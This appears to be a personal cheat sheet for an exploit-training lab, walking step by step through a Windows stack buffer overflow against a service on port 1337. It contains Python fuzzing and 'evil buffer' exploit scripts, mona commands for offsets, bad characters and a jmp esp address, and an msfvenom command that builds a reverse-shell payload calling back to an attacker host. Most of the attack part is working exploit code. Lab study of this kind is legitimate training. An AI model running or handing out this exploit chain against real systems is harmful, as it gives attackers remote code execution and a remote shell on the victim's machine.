# Buffer Overflow


## Buffer Overflow - Windows

## **Netcat can be used to find segmenatation fault and crash...**

1. Set working folder for mona.

**!mona config -set workingfolder c:\mona\%p**
  
2. Fuzz number of bytes until application crashed.

**!mona findmsp -distance <> **

```
#!/usr/bin/env python3

import socket, time, sys

ip = "MACHINE_IP"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

3. Control EIP, create a pattern and determine the offset. Add 400 bytes on the crashed bytes.

**/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600**

```
import socket

ip = "10.10.224.99"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

**/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 600 -q **


!mona findmsp -distance <numberofbytescreated>

4. Determine badchars. Create \x00 to \xff and look for missing character.
  **Note: Remember that badchars can affect the next byte as well!**

**!mona bytearray -b "\x00"**


import socket

ip = ""
port = 

prefix = b"OVERFLOW1 "
offset = 0
overflow = b"A" * offset + b"B" * 4
badchars =(
b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
retn = b""
padding = b""
payload = b""
postfix = b"C" * (<numberofbytes>-(offset+4+len(badchars)))

buffer = prefix + overflow + badchars + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + b"\r\n")
    print("Done!")
except:
    print("Could not connect.")


**!mona compare -f C:\mona\oscp\bytearray.bin -a**

5. Search for jmp esp avoiding the badchars.

**!mona jmp -r esp -cpb "\x00"**

6. Create your payload using msfvenom.

import socket
import struct

ip = "10.10.70.219"
port = 1337

prefix = b"OVERFLOW7 "
offset = 1306
#390-dummy 
overflow = b"A" * offset 
#0x625011af : jmp esp   
retn = struct.pack("I",0x625011af)
padding = b"\x90"*21
payload = b""
postfix = b"C" * (<numberofbytes>-(offset+4+len(payload+padding)))

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + b"\r\n")
    print("Done!")
except:
    print("Could not connect.")


**msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f py**  

   
